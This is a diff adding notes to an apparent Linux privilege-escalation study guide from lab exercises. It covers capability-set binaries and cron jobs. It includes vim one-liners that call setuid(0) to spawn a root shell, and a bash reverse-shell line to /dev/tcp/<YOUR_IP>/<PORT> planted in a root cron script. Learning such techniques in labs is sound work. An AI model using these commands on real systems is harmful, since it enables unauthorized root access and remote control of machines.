@@ -71,7 +71,39 @@ And when you find unusual binary that are SUID set, you can check out ways to ge
 
 ## Linux Capabilities
 
+I understand Linux capabilities as SUID or sudo. They are what system administrators use to increase the privilege level of a process or binary.
+
+Here is a practical way that was used in the lab machine for this task:
+
+First, you search for binaries, or files that are capabilities set, using this command:
+
+```bash
+getcap -r / 2>/dev/null
+```
+
+And the lab machine returned two unusual binaries that are capabilities set along with normal ones: `vim` and `view`.
+
+With `vim`, you can get to root via:
+
+```bash
+./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
+```
+Or
+
+```bash
+./vim -c ':py3 import os; os.setuid(0); os.system("/bin/bash")'
+```
+
 ## Cron Jobs
+
+Cron jobs are scheduled tasks in Linux. They can be of different privileges, depending on the users who create them and for what purposes. While properly configured cron jobs are not inherently vulnerable, they can provide a privilege escalation vector under some conditions.
+
+System wide cron jobs are available at `/etc/crontab` file. In the task scenario, there was a `backup.sh` file running each minute as root. You can gain root by creating a reverse shell command in the file. And you have to open a listener at the same port, and just wait, so that when it runs in the next minute, you might catch the shell. Here is the basic command:
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1
+```
 
 ## Linux PATH
 
